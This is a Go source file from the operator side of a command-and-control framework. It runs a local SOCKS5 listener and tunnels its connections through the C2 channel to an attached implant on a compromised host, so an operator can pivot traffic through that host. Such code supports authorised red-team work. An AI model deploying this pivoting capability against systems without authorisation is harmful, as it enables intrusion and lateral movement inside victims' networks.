//go:build !implantonly

package c2

import (
	"encoding/binary"
	"errors"
	"fmt"
	"io"
	"net"
	"strconv"
	"sync"
	"time"
)

// SOCKS5 (RFC 1928) constants.
const (
	socksVersion      = 0x05
	socksCmdConnect   = 0x01
	socksAtypIPv4     = 0x01
	socksAtypDomain   = 0x03
	socksAtypIPv6     = 0x04
	socksRepSuccess   = 0x00
	socksRepGeneral   = 0x01
	socksRepCmdUnsup  = 0x07
	socksRepAtypUnsup = 0x08
)

const (
	// tunnelOpenTimeout bounds the wait for open-ok/open-fail. It is
	// generous because frames cross the C2 channel at poll latency.
	tunnelOpenTimeout = 90 * time.Second
	// socksHandshakeTimeout bounds the SOCKS greeting+request phase.
	socksHandshakeTimeout = 30 * time.Second
	// tunnelHalfCloseGrace is how long the implant->client direction
	// keeps draining after the client half-closes.
	tunnelHalfCloseGrace = 30 * time.Second
)

var errSocksAtypUnsupported = errors.New("socks5: address type not supported")

// socksRequest is a parsed SOCKS5 client request.
type socksRequest struct {
	cmd  byte
	atyp byte
	addr string // "host:port"
}

// socksHandshake performs the greeting (no-auth only) and reads the
// client request. On success the caller owns sending the final reply.
// Returns errSocksAtypUnsupported for address types we don't handle
// (e.g. IPv6) so the caller can reply 0x08.
func socksHandshake(conn net.Conn) (*socksRequest, error) {
	// Greeting: VER NMETHODS METHODS...
	hdr := make([]byte, 2)
	if _, err := io.ReadFull(conn, hdr); err != nil {
		return nil, fmt.Errorf("socks5 greeting: %w", err)
	}
	if hdr[0] != socksVersion {
		return nil, fmt.Errorf("socks5: bad version %d", hdr[0])
	}
	methods := make([]byte, int(hdr[1]))
	if _, err := io.ReadFull(conn, methods); err != nil {
		return nil, fmt.Errorf("socks5 methods: %w", err)
	}
	noAuth := false
	for _, m := range methods {
		if m == 0x00 {
			noAuth = true
			break
		}
	}
	if !noAuth {
		_, _ = conn.Write([]byte{socksVersion, 0xFF})
		return nil, errors.New("socks5: client offers no no-auth method")
	}
	if _, err := conn.Write([]byte{socksVersion, 0x00}); err != nil {
		return nil, err
	}

	// Request: VER CMD RSV ATYP DST.ADDR DST.PORT
	reqHdr := make([]byte, 4)
	if _, err := io.ReadFull(conn, reqHdr); err != nil {
		return nil, fmt.Errorf("socks5 request: %w", err)
	}
	if reqHdr[0] != socksVersion {
		return nil, errors.New("socks5: bad request version")
	}
	req := &socksRequest{cmd: reqHdr[1], atyp: reqHdr[3]}

	var host string
	switch req.atyp {
	case socksAtypIPv4:
		b := make([]byte, 4)
		if _, err := io.ReadFull(conn, b); err != nil {
			return nil, fmt.Errorf("socks5 ipv4 addr: %w", err)
		}
		host = net.IP(b).String()
	case socksAtypDomain:
		lb := make([]byte, 1)
		if _, err := io.ReadFull(conn, lb); err != nil {
			return nil, fmt.Errorf("socks5 domain len: %w", err)
		}
		b := make([]byte, int(lb[0]))
		if _, err := io.ReadFull(conn, b); err != nil {
			return nil, fmt.Errorf("socks5 domain: %w", err)
		}
		host = string(b)
	case socksAtypIPv6:
		// Consume the address + port so the client isn't left
		// mid-write, then reject: IPv6 targets are not supported.
		b := make([]byte, 16)
		if _, err := io.ReadFull(conn, b); err != nil {
			return nil, fmt.Errorf("socks5 ipv6 addr: %w", err)
		}
		pb := make([]byte, 2)
		if _, err := io.ReadFull(conn, pb); err != nil {
			return nil, fmt.Errorf("socks5 ipv6 port: %w", err)
		}
		return req, errSocksAtypUnsupported
	default:
		return req, fmt.Errorf("socks5: unknown address type %d", req.atyp)
	}

	pb := make([]byte, 2)
	if _, err := io.ReadFull(conn, pb); err != nil {
		return nil, fmt.Errorf("socks5 port: %w", err)
	}
	req.addr = net.JoinHostPort(host, strconv.Itoa(int(binary.BigEndian.Uint16(pb))))
	return req, nil
}

// socksReply sends a CONNECT reply with a zero bind address.
func socksReply(conn net.Conn, rep byte) error {
	_, err := conn.Write([]byte{socksVersion, rep, 0x00, socksAtypIPv4,
		0, 0, 0, 0, 0, 0})
	return err
}

// reorderBuffer resequences implant->operator data frames per
// connection: frames may cross the C2 channel out of order.
type reorderBuffer struct {
	expect  int
	pending map[int][]byte
}

func newReorderBuffer() *reorderBuffer {
	return &reorderBuffer{pending: make(map[int][]byte)}
}

// push records payload at seq and returns every payload now
// deliverable in order (nil if none). Duplicates and stale seqs are
// dropped.
func (r *reorderBuffer) push(seq int, payload []byte) [][]byte {
	if seq < r.expect {
		return nil
	}
	if seq > r.expect {
		if _, dup := r.pending[seq]; !dup {
			r.pending[seq] = payload
		}
		return nil
	}
	out := [][]byte{payload}
	r.expect++
	for {
		p, ok := r.pending[r.expect]
		if !ok {
			break
		}
		delete(r.pending, r.expect)
		out = append(out, p)
		r.expect++
	}
	return out
}

// tunnelConnState is one SOCKS client connection on the operator.
type tunnelConnState struct {
	id     int
	client net.Conn
	srv    *tunnelServer
	inCh   chan Frame // frames routed from the dispatcher
	done   chan struct{}
	once   sync.Once

	sendMu  sync.Mutex
	sendSeq int // per-conn outgoing data frame counter

	halfMu sync.Mutex
	half   bool // client -> implant direction closed
}

// nextSeq allocates the next outgoing data frame seq.
func (tc *tunnelConnState) nextSeq() int {
	tc.sendMu.Lock()
	defer tc.sendMu.Unlock()
	s := tc.sendSeq
	tc.sendSeq++
	return s
}

// teardown closes the client conn, unregisters, and signals done.
// Idempotent.
func (tc *tunnelConnState) teardown() {
	tc.once.Do(func() {
		close(tc.done)
		tc.client.Close()
		tc.srv.mu.Lock()
		delete(tc.srv.conns, tc.id)
		tc.srv.mu.Unlock()
	})
}

// halfClose marks the client->implant direction closed and arms a
// grace timer so the reverse direction can drain before teardown.
func (tc *tunnelConnState) halfClose() {
	tc.halfMu.Lock()
	if tc.half {
		tc.halfMu.Unlock()
		return
	}
	tc.half = true
	tc.halfMu.Unlock()
	time.AfterFunc(tunnelHalfCloseGrace, tc.teardown)
}

// tunnelServer multiplexes SOCKS5 client connections over C2 tunnel
// frames. send ships a frame toward the implant (SendCommand in
// production, a direct call in tests).
type tunnelServer struct {
	send    func(Frame) error
	frameCh chan Frame // incoming frames from the implant (fed by orchestrator)

	mu     sync.Mutex
	conns  map[int]*tunnelConnState
	nextID int
	ln     net.Listener
	closed bool

	stopCh   chan struct{}
	stopOnce sync.Once
	wg       sync.WaitGroup
}

func newTunnelServer(send func(Frame) error) *tunnelServer {
	s := &tunnelServer{
		send:    send,
		frameCh: make(chan Frame, 256),
		conns:   make(map[int]*tunnelConnState),
		nextID:  1,
		stopCh:  make(chan struct{}),
	}
	go s.dispatchLoop()
	return s
}

// dispatchLoop routes incoming frames to their connection.
func (s *tunnelServer) dispatchLoop() {
	for {
		select {
		case <-s.stopCh:
			return
		case f := <-s.frameCh:
			s.mu.Lock()
			tc, ok := s.conns[f.Conn]
			s.mu.Unlock()
			if !ok {
				continue // frame for a torn-down connection
			}
			select {
			case tc.inCh <- f:
			case <-tc.done:
			}
		}
	}
}

// serve accepts SOCKS clients on ln in the background.
func (s *tunnelServer) serve(ln net.Listener) {
	s.mu.Lock()
	s.ln = ln
	s.mu.Unlock()
	s.wg.Add(1)
	go func() {
		defer s.wg.Done()
		for {
			c, err := ln.Accept()
			if err != nil {
				return
			}
			s.wg.Add(1)
			go func() {
				defer s.wg.Done()
				s.handleClient(c)
			}()
		}
	}()
}

// close stops the listener and tears down all connections.
func (s *tunnelServer) close() {
	s.stopOnce.Do(func() { close(s.stopCh) })
	s.mu.Lock()
	if s.closed {
		s.mu.Unlock()
		return
	}
	s.closed = true
	ln := s.ln
	conns := make([]*tunnelConnState, 0, len(s.conns))
	for _, tc := range s.conns {
		conns = append(conns, tc)
	}
	s.mu.Unlock()
	if ln != nil {
		ln.Close()
	}
	for _, tc := range conns {
		tc.teardown()
	}
	s.wg.Wait()
}

// connCount reports the number of live connections (tests).
func (s *tunnelServer) connCount() int {
	s.mu.Lock()
	defer s.mu.Unlock()
	return len(s.conns)
}

// handleClient runs the SOCKS5 handshake, opens a tunnel connection,
// and pumps data in both directions until teardown.
func (s *tunnelServer) handleClient(c net.Conn) {
	_ = c.SetDeadline(time.Now().Add(socksHandshakeTimeout))
	req, err := socksHandshake(c)
	if err != nil {
		if errors.Is(err, errSocksAtypUnsupported) {
			_ = socksReply(c, socksRepAtypUnsup)
		}
		c.Close()
		return
	}
	if req.cmd != socksCmdConnect {
		_ = socksReply(c, socksRepCmdUnsup)
		c.Close()
		return
	}

	s.mu.Lock()
	if s.closed {
		s.mu.Unlock()
		c.Close()
		return
	}
	id := s.nextID
	s.nextID++
	tc := &tunnelConnState{
		id:     id,
		client: c,
		srv:    s,
		inCh:   make(chan Frame, 64),
		done:   make(chan struct{}),
	}
	s.conns[id] = tc
	s.mu.Unlock()
	defer tc.teardown()

	if err := s.send(Frame{Conn: id, Op: TunnelOpOpen, Addr: req.addr}); err != nil {
		_ = socksReply(c, socksRepGeneral)
		return
	}

	// Wait for open-ok / open-fail. The implant sends open-ok before
	// any data frame and the channel is FIFO, so no data frame can be
	// consumed (and lost) here ahead of it.
	timer := time.NewTimer(tunnelOpenTimeout)
	defer timer.Stop()
	for {
		select {
		case f := <-tc.inCh:
			switch f.Op {
			case TunnelOpOpenOK:
				goto opened
			case TunnelOpOpenFail:
				_ = socksReply(c, socksRepGeneral)
				return
			}
		case <-timer.C:
			_ = socksReply(c, socksRepGeneral)
			return
		}
	}

opened:
	_ = c.SetDeadline(time.Time{})
	if err := socksReply(c, socksRepSuccess); err != nil {
		return
	}

	// client -> implant
	go func() {
		buf := make([]byte, tunnelReadChunk)
		for {
			n, err := c.Read(buf)
			if n > 0 {
				seq := tc.nextSeq()
				if serr := s.send(NewDataFrame(id, seq, buf[:n])); serr != nil {
					break
				}
			}
			if err != nil {
				break
			}
		}
		// No more client data: tell the implant, then let the reverse
		// direction drain (half-close).
		_ = s.send(Frame{Conn: id, Op: TunnelOpClose})
		tc.halfClose()
	}()

	tc.writeLoop()
}

// writeLoop delivers implant->client data frames in order, and ends
// the connection on a close frame.
func (tc *tunnelConnState) writeLoop() {
	rb := newReorderBuffer()
	for {
		select {
		case <-tc.done:
			return
		case f := <-tc.inCh:
			switch f.Op {
			case TunnelOpData:
				payload, err := f.Payload()
				if err != nil {
					continue
				}
				for _, p := range rb.push(f.Seq, payload) {
					if err := writeFull(tc.client, p); err != nil {
						tc.teardown()
						return
					}
				}
			case TunnelOpClose:
				tc.teardown()
				return
			}
		}
	}
}

// --- Operator wiring ---

// Operator structs cannot gain fields without editing operator.go, so
// tunnel servers live in a package-level registry keyed by operator.
var (
	operatorTunnelsMu sync.Mutex
	operatorTunnels   = make(map[*Operator]*tunnelServer)
)

// StartTunnel starts a local SOCKS5 listener on 127.0.0.1:port
// (default 1080 if port==0) whose connections are multiplexed over
// the C2 channel to the attached implant. Requires an attached agent.
func (op *Operator) StartTunnel(port int) error {
	if port == 0 {
		port = 1080
	}

	op.mu.RLock()
	attached := op.attachedClient
	alias := ""
	if info, ok := op.connectedClients[attached]; ok {
		alias = info.Alias
	}
	op.mu.RUnlock()
	if attached == "" {
		return errors.New("tunnel requires an attached agent (use 'attach <id>' first)")
	}

	operatorTunnelsMu.Lock()
	if _, ok := operatorTunnels[op]; ok {
		operatorTunnelsMu.Unlock()
		return errors.New("tunnel already running for this operator")
	}
	operatorTunnelsMu.Unlock()

	ln, err := net.Listen("tcp", fmt.Sprintf("127.0.0.1:%d", port))
	if err != nil {
		return fmt.Errorf("tunnel listen: %w", err)
	}

	srv := newTunnelServer(func(f Frame) error {
		_, err := op.SendCommand("tunnel", f.toArgs())
		return err
	})
	srv.serve(ln)

	operatorTunnelsMu.Lock()
	operatorTunnels[op] = srv
	operatorTunnelsMu.Unlock()

	name := alias
	if name == "" {
		name = attached
		if len(name) > 8 {
			name = name[:8]
		}
	}
	fmt.Printf("[*] SOCKS5 tunnel listening on 127.0.0.1:%d (via %s)\n", port, name)
	return nil
}

// TunnelFrameCh returns the channel the orchestrator feeds with
// tunnel frames parsed (via FrameFromResult) from module=="tunnel"
// results in PollResults. Returns nil if no tunnel is running.
func (op *Operator) TunnelFrameCh() chan<- Frame {
	operatorTunnelsMu.Lock()
	defer operatorTunnelsMu.Unlock()
	if srv, ok := operatorTunnels[op]; ok {
		return srv.frameCh
	}
	return nil
}

// StopTunnel shuts down the operator's SOCKS5 listener and all of its
// tunneled connections.
func (op *Operator) StopTunnel() {
	operatorTunnelsMu.Lock()
	srv, ok := operatorTunnels[op]
	if ok {
		delete(operatorTunnels, op)
	}
	operatorTunnelsMu.Unlock()
	if ok {
		srv.close()
	}
}
